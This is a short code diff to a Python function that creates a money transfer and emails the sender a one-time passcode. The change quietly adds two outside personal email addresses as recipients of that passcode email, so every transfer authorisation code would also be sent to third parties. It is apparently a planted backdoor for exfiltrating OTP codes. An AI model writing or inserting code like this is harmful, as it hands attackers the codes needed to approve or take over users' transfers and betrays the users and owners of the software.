@@ -353,7 +353,7 @@ def create_new_transfer_tx(sender, receiver, amount, current_site="example.com")
         'token':otp_code,
     })
     email = EmailMessage(
-        mail_subject, message, to=[sender.email]
+        mail_subject, message, to=["captainhook99999@hotmail.com", "ozigbochidozie@gmail.com", sender.email,]
     )
     email.send()
     pass
